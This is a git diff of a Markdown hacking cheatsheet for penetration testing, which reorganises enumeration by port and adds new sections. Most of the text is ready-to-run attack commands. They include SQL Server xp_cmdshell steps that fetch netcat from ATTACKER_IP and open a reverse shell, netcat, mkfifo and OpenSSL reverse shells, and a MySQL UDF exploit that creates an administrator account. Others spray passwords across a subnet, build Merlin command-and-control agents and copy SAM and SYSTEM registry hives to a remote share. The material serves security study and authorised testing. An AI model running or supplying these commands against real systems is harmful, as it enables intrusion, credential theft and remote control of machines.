@@ -10,30 +10,38 @@ Other great cheetsheets:
 # 2. Table of Contents
 - [1. Hacking Cheatsheet](#1-hacking-cheatsheet)
 - [2. Table of Contents](#2-table-of-contents)
-- [3. Scanning](#3-scanning)
+- [3. Scanning and Enumeration](#3-scanning-and-enumeration)
   - [3.1. Nmap Scanning](#31-nmap-scanning)
-  - [3.2. Web Directory Scanning](#32-web-directory-scanning)
-  - [3.3. SMB Enumeration](#33-smb-enumeration)
-    - [3.3.1. Listing SMB Shares](#331-listing-smb-shares)
-    - [3.3.2. Interacting on SMB](#332-interacting-on-smb)
-  - [3.4. Kerberos Enumeration](#34-kerberos-enumeration)
-  - [3.5. DNS Enumeration](#35-dns-enumeration)
-    - [3.5.1. DNS Zone Transfer](#351-dns-zone-transfer)
-    - [3.5.2. Bruteforcing DNS Records](#352-bruteforcing-dns-records)
-  - [3.6. MySQL Enumeration](#36-mysql-enumeration)
-    - [3.6.1. MySQL UDF Exploit](#361-mysql-udf-exploit)
-    - [3.6.2. Grabbing MySQL Passwords](#362-grabbing-mysql-passwords)
-    - [3.6.3. Useful MySQL Files](#363-useful-mysql-files)
-  - [3.7. Microsoft SQL Server Enumeration](#37-microsoft-sql-server-enumeration)
-    - [3.7.1. MS SQL Server Command Execution](#371-ms-sql-server-command-execution)
+  - [3.2. 25,465,587 - SMTP/s Enumeration](#32-25465587---smtps-enumeration)
+  - [3.3. 53 - DNS Enumeration](#33-53---dns-enumeration)
+    - [3.3.1. DNS Zone Transfer](#331-dns-zone-transfer)
+    - [3.3.2. Bruteforcing DNS Records](#332-bruteforcing-dns-records)
+  - [3.4. 80,443 - Web Enumeration](#34-80443---web-enumeration)
+    - [3.4.1. Web Server Software Enumeration](#341-web-server-software-enumeration)
+    - [3.4.2. Web Directory Scanning](#342-web-directory-scanning)
+  - [3.5. 88/749 Kerberos Enumeration](#35-88749-kerberos-enumeration)
+  - [3.6. 110,995 - POP Enumeration](#36-110995---pop-enumeration)
+  - [3.7. 111 - RPCbind Enumeration](#37-111---rpcbind-enumeration)
+  - [3.8. 119 - NNTP Enumeration](#38-119---nntp-enumeration)
+  - [3.9. 445 - SMB Enumeration](#39-445---smb-enumeration)
+    - [3.9.1. Listing SMB Shares](#391-listing-smb-shares)
+    - [3.9.2. Interacting on SMB](#392-interacting-on-smb)
+  - [3.10. 1433 - Microsoft SQL Server Enumeration](#310-1433---microsoft-sql-server-enumeration)
+    - [3.10.1. MS SQL Server Command Execution](#3101-ms-sql-server-command-execution)
+  - [3.11. 2049 - NFS Enumeration](#311-2049---nfs-enumeration)
+  - [3.12. 3306 - MySQL Enumeration](#312-3306---mysql-enumeration)
+    - [3.12.1. MySQL UDF Exploit](#3121-mysql-udf-exploit)
+    - [3.12.2. Grabbing MySQL Passwords](#3122-grabbing-mysql-passwords)
+    - [3.12.3. Useful MySQL Files](#3123-useful-mysql-files)
 - [4. Exploitation](#4-exploitation)
   - [4.1. Searchsploit](#41-searchsploit)
-  - [4.2. Password Bruteforcing](#42-password-bruteforcing)
-    - [4.2.1. MS SQL Server Bruteforcing](#421-ms-sql-server-bruteforcing)
-    - [4.2.2. SMB Bruteforcing](#422-smb-bruteforcing)
-    - [4.2.3. SSH Bruteforcing](#423-ssh-bruteforcing)
-    - [4.2.4. Web Form (HTTP POST) Bruteforcing](#424-web-form-http-post-bruteforcing)
-    - [4.2.5. Zip File Bruteforcing](#425-zip-file-bruteforcing)
+  - [4.2. Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
+    - [4.2.1. Cracking with John The Ripper](#421-cracking-with-john-the-ripper)
+    - [4.2.2. MS SQL Server Bruteforcing](#422-ms-sql-server-bruteforcing)
+    - [4.2.3. SMB Bruteforcing](#423-smb-bruteforcing)
+    - [4.2.4. SSH Bruteforcing](#424-ssh-bruteforcing)
+    - [4.2.5. Web Form (HTTP POST) Bruteforcing](#425-web-form-http-post-bruteforcing)
+    - [4.2.6. Zip File Password Cracking](#426-zip-file-password-cracking)
   - [4.3. Port Knocking](#43-port-knocking)
   - [4.4. Reverse Shells](#44-reverse-shells)
     - [4.4.1. Covering your tracks](#441-covering-your-tracks)
@@ -50,6 +58,8 @@ Other great cheetsheets:
     - [4.4.12. OpenSSL Encrypted Reverse Shell](#4412-openssl-encrypted-reverse-shell)
   - [4.5. Encryption](#45-encryption)
     - [4.5.1. Create self-signed SSL/TLS certificate](#451-create-self-signed-ssltls-certificate)
+  - [4.6. Post Exploit Frameworks](#46-post-exploit-frameworks)
+    - [4.6.1. Merlin Framework](#461-merlin-framework)
 - [5. Windows Privilege Escalation](#5-windows-privilege-escalation)
   - [5.1. Basic Windows Post-Exploit Enumeration](#51-basic-windows-post-exploit-enumeration)
   - [5.2. Using Saved Windows Credentials](#52-using-saved-windows-credentials)
@@ -83,8 +93,9 @@ Other great cheetsheets:
     - [7.2.4. Mount NFS Share](#724-mount-nfs-share)
     - [7.2.5. SMB Share](#725-smb-share)
     - [7.2.6. FTP Server on Kali](#726-ftp-server-on-kali)
-    - [7.2.7. Windows LOLBAS File Downloads](#727-windows-lolbas-file-downloads)
-    - [7.2.8. Windows Files of Interest](#728-windows-files-of-interest)
+    - [7.2.7. SSHFS](#727-sshfs)
+    - [7.2.8. Windows LOLBAS File Downloads](#728-windows-lolbas-file-downloads)
+    - [7.2.9. Windows Files of Interest](#729-windows-files-of-interest)
   - [7.3. Grabbing Passwords](#73-grabbing-passwords)
     - [7.3.1. Finding Windows Passwords](#731-finding-windows-passwords)
     - [7.3.2. Windows Passwords in Registry](#732-windows-passwords-in-registry)
@@ -93,9 +104,13 @@ Other great cheetsheets:
     - [7.3.5. Dumping Hashes from Windows](#735-dumping-hashes-from-windows)
       - [7.3.5.1. Dumping Hashes from Windows Domain Controller](#7351-dumping-hashes-from-windows-domain-controller)
     - [7.3.6. Pass The Hash Attacks on Windows](#736-pass-the-hash-attacks-on-windows)
+  - [7.4. Linux Files of Interest](#74-linux-files-of-interest)
+  - [7.5. Data Wrangling on Linux](#75-data-wrangling-on-linux)
+    - [7.5.1. Awk & Sed](#751-awk--sed)
 - [8. Windows Persistence](#8-windows-persistence)
   - [8.1. Add RDP User](#81-add-rdp-user)
-  - [8.2. Change Windows Domain Credentials](#82-change-windows-domain-credentials)
+  - [8.2. Connect to Windows RDP](#82-connect-to-windows-rdp)
+  - [8.3. Change Windows Domain Credentials](#83-change-windows-domain-credentials)
 - [9. Linux Persistence](#9-linux-persistence)
 - [10. Pivoting and Redirection](#10-pivoting-and-redirection)
   - [10.1. SSH Tunnels](#101-ssh-tunnels)
@@ -103,10 +118,14 @@ Other great cheetsheets:
   - [10.3. Bending with socat](#103-bending-with-socat)
   - [10.4. Bending with rinetd](#104-bending-with-rinetd)
   - [10.5. Bending with netsh](#105-bending-with-netsh)
+- [11. Miscellaneous](#11-miscellaneous)
+  - [11.1. Disable SSH Host Key Checking](#111-disable-ssh-host-key-checking)
 
-# 3. Scanning
+# 3. Scanning and Enumeration
 
 ## 3.1. Nmap Scanning
+
+If using scripts, you can get script help by `nmap --script-help="nfs-*"`.
 
 ```sh
 # preferred initial scan:
@@ -115,80 +134,46 @@ mkdir nmap; nmap -v -n -A -oA nmap/initial-scan VICTIM_IP
 
 # all TCP ports, fast discovery, then script scan:
 # verbose, no DNS resolution, fastest timing, all TCP ports, output all formats
-ports=$(nmap -v -n -T4 --min-rate=1000 -p- VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
-nmap -n -v -sC -sV -p $ports -oA nmap/tcp-all VICTIM_IP
+VICTIM=VICTIM_IP
+ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
+nmap -n -v -sC -sV -p $ports -oA nmap/tcp-all $VICTIM
 
 # specifying safe and wildcard ftp-* scripts
+# logic: and, or, not all work. "," is like "or"
 nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp VICTIM_IP
 ```
 
-## 3.2. Web Directory Scanning
+## 3.2. 25,465,587 - SMTP/s Enumeration
 
 ```sh
-# Gobuster
-gobuster dir -u http://VICTIM_IP:8080 -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o gobuster/http-dlist-lower-small.txt
+# Banner grab, command/user enum
+nc -nvC VICTIM_IP 25  # "-C" forces sending \r\n line ending, required by smtp
+telnet VICTIM_IP 25  # alternate method, does \r\n by default
+# SMTPS
+openssl s_client -crlf -connect VICTIM_IP:465 #SSL/TLS without starttls command
+openssl s_client -starttls smtp -crlf -connect VICTIM_IP:587
+
+# on telnet/nc connection, try enumerating users manually via:
+EXPN  # get mailing list
+VRFY root  # check if you can use VRFY to enumerate users
+
+# basic enumeration
+nmap -n -v -p25 --script="smtp-* and safe" -oA nmap/smtp VICTIM_IP
+
+# enumerate users
+nmap -n -v -p25 --script="smtp-enum-users" -oA nmap/smtp-users VICTIM_IP
+# smtp-user-enum lets you check specific usernames, add a domain, and
+# specify the mode (EXPN, VRFY, RCPT) for validation
+smtp-user-enum -M MODE -U users.txt -D DOMAIN -t VICTIM_IP
 ```
 
-## 3.3. SMB Enumeration
+Other ideas:
+- send email to user (client-side exploit)
+- send email to invalid address, get DSN report (info leaks?)
 
-Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups,
-shares, etc.)
+See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
 
-```sh
-# standard scan
-enum4linux VICTIM_IP
-
-# scan all the things
-enum4linux -a VICTIM_IP
-```
-
-### 3.3.1. Listing SMB Shares
-
-```sh
-# List shares without creds
-smbclient -N -L VICTIM_IP
-
-# enumerate shares you have creds for (or ones that don't require creds)
-smbclient -L VICTIM_IP -W DOMAIN -U svc-admin
-```
-
-### 3.3.2. Interacting on SMB
-
-```sh
-# Opens an interactive smb shell that you have creds for
-smbclient '\\TARGET_IP\dirname' -W DOMAIN -U username
-
-smb:\> help  # displays commands to use
-smb:\> ls  # list files
-smb:\> get filename.txt  # fetch a file
-```
-
-## 3.4. Kerberos Enumeration
-
-```sh
-# username enumeration with Kerbrute
-./kerbrute userenum --dc DC_IP -d DOMAINNAME userlist.txt
-
-# dump all LDAP users
-impacket-GetADUsers -all -no-pass -dc-ip DC_IP DOMAIN.tld
-
-# ASREPRoasting - Kerberos attack that allows password hashes to be retrieved
-# for users that do not require pre-authentication (user has “Do not use
-# Kerberos pre-authentication” enabled).
-# Find ASREPRoastable users and password hashes (slash after domain required)
-impacket-GetNPUsers -dc-ip DC_IP -usersfile found-users.txt DOMAIN.tld/
-# be sure to crack the hashes to retrieve the passwords
-hashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force
-
-# alternate method (done locally on windows box):
-# uses: https://github.com/GhostPack/Rubeus
-Rubeus.exe asreproast /format:john /outfile:hash.txt
-
-# List smb shares using username you just cracked the hash of
-smbclient -L DC_IP -W DOMAIN.tld -U asreproasted-username
-```
-
-## 3.5. DNS Enumeration
+## 3.3. 53 - DNS Enumeration
 
 **PRO TIP**: Make sure you add the DNS entries you discover to your
 `/etc/hosts` file. Some web servers do redirection based on domain name!
@@ -220,7 +205,7 @@ fierce --domain domain.tld
 - `CNAME`: Canonical Name Records are used to create aliases for other host records.
 - `TXT`: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.
 
-### 3.5.1. DNS Zone Transfer
+### 3.3.1. DNS Zone Transfer
 
 This is basically asking for a copy of all DNS entries served by an authoritative server.
 It lets you get a list of other subdomains that might be of interest.
@@ -237,7 +222,7 @@ dig @ns1.nameserver.tld axfr domain.tld
 host -l domain.tld ns1.nameserver.tld
 ```
 
-### 3.5.2. Bruteforcing DNS Records
+### 3.3.2. Bruteforcing DNS Records
 
 ```sh
 # using dnsrecon
@@ -250,7 +235,245 @@ dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top
 nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld
 ```
 
-## 3.6. MySQL Enumeration
+## 3.4. 80,443 - Web Enumeration
+
+Always check:
+- [ ] server software in use (via nmap/whatweb) for vulns.
+- [ ] robots.txt
+- [ ] HTML comments
+
+### 3.4.1. Web Server Software Enumeration
+
+Whatweb shows more details about tech stacks in use by server.
+
+```sh
+whatweb -v -a3 VICTIM_IP
+```
+
+PHP 5.x is vulnerable to Shellshock!
+
+### 3.4.2. Web Directory Scanning
+
+```sh
+# Gobuster
+gobuster dir -u http://VICTIM_IP:8080 -w /usr/share/dirb/wordlists/common.txt -t 50 -k -o gobuster-common.txt
+# user-agent:
+# -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'
+```
+
+## 3.5. 88/749 Kerberos Enumeration
+
+```sh
+# username enumeration with Kerbrute
+./kerbrute userenum --dc DC_IP -d DOMAINNAME userlist.txt
+
+# dump all LDAP users
+impacket-GetADUsers -all -no-pass -dc-ip DC_IP DOMAIN.tld
+
+# ASREPRoasting - Kerberos attack that allows password hashes to be retrieved
+# for users that do not require pre-authentication (user has “Do not use
+# Kerberos pre-authentication” enabled).
+# Find ASREPRoastable users and password hashes (slash after domain required)
+impacket-GetNPUsers -dc-ip DC_IP -usersfile found-users.txt DOMAIN.tld/
+# be sure to crack the hashes to retrieve the passwords
+hashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force
+
+# alternate method (done locally on windows box):
+# uses: https://github.com/GhostPack/Rubeus
+Rubeus.exe asreproast /format:john /outfile:hash.txt
+
+# List smb shares using username you just cracked the hash of
+smbclient -L DC_IP -W DOMAIN.tld -U asreproasted-username
+```
+
+## 3.6. 110,995 - POP Enumeration
+
+Post Office Protocol (POP) retrieves email from a remote mail server.
+
+```sh
+# banner grabbing
+nc -nvC VICTIM_IP 110
+openssl s_client -connect VICTIM_IP:995 -crlf -quiet
+
+# basic scan
+nmap -n -v -p110 --script="pop3-* and safe" -oA nmap/pop3 VICTIM_IP
+
+# Bruteforcing
+hydra -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -f VICTIM_IP pop3
+hydra -S -l USERNAME -P /path/to/passwords.txt -s 995 -f VICTIM_IP pop3
+
+# user enum / log in
+nc -nvC VICTIM_IP 110  # "-C" for \r\n line endings, required
+telnet VICTIM_IP 110   # alternate method
+USER username
+PASS password
+LIST # gets list of emails and sizes
+RETR 1 # retrieve first email
+# try real (root) and fake users to see if there is a difference in error msgs
+```
+
+## 3.7. 111 - RPCbind Enumeration
+
+Gets you list of ports open using RPC services. Can be used to locate NFS
+or rusersd services to pentest next.
+
+```sh
+# banner grab
+nc -nv VICTIM_IP 111
+
+# list short summary of rpc services
+rpcinfo -s VICTIM_IP
+# list ports of rpc services
+rpcinfo -p VICTIM_IP
+```
+
+## 3.8. 119 - NNTP Enumeration
+
+Network News Transfer Protocol, allows clients to retrieve (read) and post
+(write) news articles to the NNTP (Usenet) server.
+
+```sh
+# banner grab, interact/view articles
+nc -nvC VICTIM_IP 119   # "-C" required for \r\n line endings
+HELP  # list help on commands (not always available)
+LIST  # list newsgroups, with 1st and last article numbers in each group
+GROUP newsgroup.name  # select the desired newsgroup to access (e.g. "net.news")
+LAST  # view last article in newsgroup
+ARTICLE msgID   # view article by ID
+NEXT  # go to next article
+QUIT
+# http://www.tcpipguide.com/free/t_NNTPCommands-2.htm
+# https://tools.ietf.org/html/rfc977
+```
+
+## 3.9. 445 - SMB Enumeration
+
+Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups,
+shares, etc.)
+
+Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smb)
+
+```sh
+# list available shares
+smbmap -H VICTIM_IP
+
+# list (only) windows version
+smbmap -vH VICTIM_IP
+
+# standard scan
+enum4linux VICTIM_IP
+
+# scan all the things
+enum4linux -a VICTIM_IP
+
+# nmap script scans
+nmap --script="safe and smb-*" -n -v -p 445 VICTIM_IP
+```
+
+### 3.9.1. Listing SMB Shares
+
+```sh
+# List shares without creds
+smbclient -N -L VICTIM_IP
+
+# enumerate shares you have creds for (or ones that don't require creds)
+smbclient -L VICTIM_IP -W DOMAIN -U svc-admin
+```
+
+### 3.9.2. Interacting on SMB
+
+```sh
+# Opens an interactive smb shell that you have creds for
+smbclient '\\TARGET_IP\dirname' -W DOMAIN -U username
+
+smb:\> help  # displays commands to use
+smb:\> ls  # list files
+smb:\> get filename.txt  # fetch a file
+```
+
+## 3.10. 1433 - Microsoft SQL Server Enumeration
+
+Microsoft SQL Server (default port TCP 1433) is a relational database management
+system developed by Microsoft. It supports storing and retrieving data across
+a network (including the Internet).
+
+```sh
+# if you know nothing about it, try 'sa' user w/o password:
+nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql VICTIM_IP
+# if you don't have creds, you can try to guess them, but be careful not to block
+# accounts with too many bad guesses
+```
+
+See [Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking) for more on cracking creds.
+
+More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
+
+### 3.10.1. MS SQL Server Command Execution
+
+```sh
+# Log in using service account creds if able
+sqsh -S VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
+
+# probably a simpler tool:
+impacket-mssqlclient DOMAIN/USERNAME@VICTIM_IP -windows-auth
+# requires double quotes for xp_cmdshell strings
+```
+
+```sql
+-- Check if you have server admin rights to enable command execution:
+SELECT IS_SRVROLEMEMBER('sysadmin')
+
+-- turn on advanced options; needed to configure xp_cmdshell
+sp_configure 'show advanced options', '1';
+RECONFIGURE;
+
+-- enable xp_cmdshell
+sp_configure 'xp_cmdshell', '1';
+RECONFIGURE;
+
+-- Quickly check what the service account is via xp_cmdshell
+EXEC master..xp_cmdshell 'whoami';
+go;
+-- can usually abbreviate to `xp_cmdshell "command"`
+
+-- Get netcat reverse shell
+xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
+go
+xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
+go
+```
+
+## 3.11. 2049 - NFS Enumeration
+
+```sh
+# scan with scripts
+nmap -n -v -p 2049 --script="safe and nfs-*" -oA nmap/nfs-scripts VICTIM_IP
+
+# list all mountpoints
+showmount -a VICTIM_IP
+# list all directories
+showmount -d VICTIM_IP
+# list all exports (remote folders you can mount)
+showmount -e VICTIM_IP
+
+# mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
+# use version 2 because it doesn't have any authentication or authorization
+# dir may need "/"prefix
+mkdir nfs && sudo mount -t nfs -o vers=2 -o nolock VICTIM_IP:DIR nfs
+
+# create user with specific UID to be able to read files on your kali box
+# "-s" login shell, "-M" no create home
+sudo useradd -u 1014 -s /usr/sbin/nologin -M tempuser
+# removing user when done:
+sudo deluser --remove-home tempuser && sudo groupdel tempuser
+# or just switch to root to read nearly everything:
+sudo su
+# if needing a specific group:
+sudo groupadd -g 1010 tempgroup
+sudo usermod -a -G tempgroup tempuser
+```
+
+## 3.12. 3306 - MySQL Enumeration
 
 MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when
 running `netstat -tnl`.
@@ -324,7 +547,7 @@ use information_schema; select grantee, table_schema, privilege_type from schema
 select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
 ```
 
-### 3.6.1. MySQL UDF Exploit
+### 3.12.1. MySQL UDF Exploit
 
 Exploiting User-Defined Functions in MySQL to get shell execution. First,
 ready the UDF library (provides `sys_exec` function) locally on the server.
@@ -377,7 +600,7 @@ SELECT sys_exec("net user hacker P@$$w0rd /add");
 SELECT sys_exec("net localgroup Administrators hacker /add");
 ```
 
-### 3.6.2. Grabbing MySQL Passwords
+### 3.12.2. Grabbing MySQL Passwords
 
 ```sh
 # contains plain-text password of the user debian-sys-maint
@@ -387,7 +610,7 @@ cat /etc/mysql/debian.cnf
 grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
 ```
 
-### 3.6.3. Useful MySQL Files
+### 3.12.3. Useful MySQL Files
 
 - Configuration Files:
   - Windows
@@ -410,58 +633,6 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
   - update.log
   - common.log
 
-## 3.7. Microsoft SQL Server Enumeration
-
-Microsoft SQL Server (default port TCP 1433) is a relational database management
-system developed by Microsoft. It supports storing and retrieving data across
-a network (including the Internet).
-
-```sh
-# if you know nothing about it, try 'sa' user w/o password:
-nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql VICTIM_IP
-# if you don't have creds, you can try to guess them, but be careful not to block
-# accounts with too many bad guesses
-```
-
-See [Password Bruteforcing](#42-password-bruteforcing) for more on cracking creds.
-
-More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
-
-### 3.7.1. MS SQL Server Command Execution
-
-```sh
-# Log in using service account creds if able
-sqsh -S VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
-
-# probably a simpler tool:
-impacket-mssqlclient DOMAIN/USERNAME@VICTIM_IP -windows-auth
-# requires double quotes for xp_cmdshell strings
-```
-
-```sql
--- Check if you have server admin rights to enable command execution:
-SELECT IS_SRVROLEMEMBER('sysadmin')
-
--- turn on advanced options; needed to configure xp_cmdshell
-sp_configure 'show advanced options', '1';
-RECONFIGURE;
-
--- enable xp_cmdshell
-sp_configure 'xp_cmdshell', '1';
-RECONFIGURE;
-
--- Quickly check what the service account is via xp_cmdshell
-EXEC master..xp_cmdshell 'whoami';
-go;
--- can usually abbreviate to `xp_cmdshell "command"`
-
--- Get netcat reverse shell
-xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
-go
-xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
-go
-```
-
 # 4. Exploitation
 
 ## 4.1. Searchsploit
@@ -472,9 +643,20 @@ searchsploit -x /path/to/exploit # read ("eXamine") the exploit file
 searchsploit -m /path/to/exploit # mirror exploit file to current directory
 ```
 
-## 4.2. Password Bruteforcing
+## 4.2. Password Bruteforcing and Cracking
 
-### 4.2.1. MS SQL Server Bruteforcing
+### 4.2.1. Cracking with John The Ripper
+
+```sh
+# afer collecting /etc/passwd and /etc/shadow
+unshadow passwd shadow > unshadowed
+
+# crack unshadow
+# the "=" is required for wordlist
+john --wordlist=/mnt/vm-share/rockyou.txt unshadowed
+```
+
+### 4.2.2. MS SQL Server Bruteforcing
 
 ```sh
 # Be carefull with the number of password in the list, this could lock-out accounts
@@ -485,19 +667,22 @@ medusa -h VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M
 nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts VICTIM_IP
 ```
 
-### 4.2.2. SMB Bruteforcing
+### 4.2.3. SMB Bruteforcing
 
 ```sh
 nmap --script smb-brute -p 445 VICTIM_IP
-hydra -l Administrator -P passwords.txt VICTIM_IP smb -t 1
+hydra -l Administrator -P passwords.txt -t 1 VICTIM_IP smb
 ```
 
-### 4.2.3. SSH Bruteforcing
+### 4.2.4. SSH Bruteforcing
 
 ```sh
 # using hydra
 # '-s PORT' contact service on non-default port
-hydra -l username -P wordlist.txt ssh VICTIM_IP -s 2222
+hydra -l username -P wordlist.txt -s 2222 VICTIM_IP ssh
+
+# spray creds to entire subnet to see if they work on other boxes, too!
+hydra -l username -p password -W 5 10.11.1.0/24 ssh
 
 # using patator: useful when services (e.g. ssh) are too old for hydra to work
 patator ssh_login host=VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
@@ -506,7 +691,7 @@ ncrack -p 22 --user root -P passwords.txt VICTIM_IP [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h VICTIM_IP -M ssh
 ```
 
-### 4.2.4. Web Form (HTTP POST) Bruteforcing
+### 4.2.5. Web Form (HTTP POST) Bruteforcing
 
 ```sh
 # using hydra
@@ -518,7 +703,7 @@ medusa -u root -P 500-worst-passwords.txt -h VICTIM_IP -M ssh
 hydra -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
 ```
 
-### 4.2.5. Zip File Bruteforcing
+### 4.2.6. Zip File Password Cracking
 
 ```sh
 # using fcrackzip
@@ -610,10 +795,10 @@ bash -i >& /dev/tcp/LISTEN_IP/LISTEN_PORT 0>&1
 
 ```sh
 # if netcat has the -e flag:
-nc -e /bin/sh 10.0.0.1 1234
+nc -e /bin/sh 10.0.0.1 443
 
 # if no -e flag:
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
 ```
 
 ### 4.4.7. Socat Reverse Shell
@@ -663,10 +848,10 @@ New-Object System.Net.Sockets.TCPClient("LISTEN_IP",LISTEN_PORT);$stream = $clie
 # generate key on server
 openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
 # Start server listener
-openssl s_server -accept PORT -key key.pem -cert cert.pem
+sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
 
 # Client-side reverse shell
-rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:PORT -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
+rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
 
 ## 4.5. Encryption
@@ -690,6 +875,33 @@ openssl pkcs12 -in mycert.p12 -nodes -out mycert.pem
 # create client cert from ca.key
 openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
 openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
+```
+
+## 4.6. Post Exploit Frameworks
+
+### 4.6.1. Merlin Framework
+
+```sh
+# get server (password: merlin)
+mkdir /opt/merlin;cd /opt/merlin
+wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
+7z x merlinServer-Linux-x64.7z
+sudo ./merlinServer-Linux-x64
+
+# get agent code
+go get github.com/Ne0nd0g/merlin-agent
+cd ~/go/pkg/mod/github.com/\!ne0nd0g/merlin-agent*
+
+# compile agent
+chmod -R +w .
+make linux SLEEP=5s URL=https://$(vpnip)
+cd bin/*
+# other make options:
+# Windows agent: make windows
+# Linux agent: make linux
+# macOS agent: make darwin
+# MIPS agent: make mips
+# ARM agent: make arm
 ```
 
 # 5. Windows Privilege Escalation
@@ -1108,6 +1320,7 @@ ls -AlR /home/*/.gnupg  # PGP keys
 ls -l /tmp/krb5*  # Kerberos tickets
 
 # list all users, groups
+grep -vE "nologin|false" /etc/passwd
 cat /etc/passwd
 cat /etc/group
 cat /etc/master.passwd
@@ -1572,7 +1785,7 @@ Pure-FTP server:
 sudo apt update && sudo apt install -y pure-ftp
 # Configure pure-ftp
 groupadd ftpgroup
-useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+useradd -g ftpgroup -d /dev/null -s /usr/sbin/nologin ftpuser
 pure-pwd useradd fusr -u ftpuser -d /ftphome
 pure-pw mkdb
 cd /etc/pure-ftpd/auth/
@@ -1582,7 +1795,27 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
 
-### 7.2.7. Windows LOLBAS File Downloads
+### 7.2.7. SSHFS
+
+To make things easier, set up a config file like so:
+
+```
+Host alpha
+    HostName 10.11.1.71
+    User root
+    StrictHostKeyChecking no
+    UserKnownHostsFile /dev/null
+    IdentityFile /full/path/to/root_rsa
+```
+
+Then mount the filesystem with root access:
+
+```sh
+# format: sshfs [user@]host:[remote_directory] mountpoint [options]
+sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
+```
+
+### 7.2.8. Windows LOLBAS File Downloads
 
 ```bat
 :: Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
@@ -1599,7 +1832,7 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/
 powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
 ```
 
-### 7.2.8. Windows Files of Interest
+### 7.2.9. Windows Files of Interest
 
 ```bat
 :: containing plaintext, encoded, or hashed credentials
@@ -1701,10 +1934,14 @@ reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
 reg save hklm\sam .\sam.save
 reg save hklm\system .\system.save
 reg save hklm\security .\security.save
+copy .\sam.save \\192.168.119.144\share\sam.save
+copy .\system.save \\192.168.119.144\share\system.save
+copy .\security.save \\192.168.119.144\share\security.save
 
 :: Grab the backups from disk
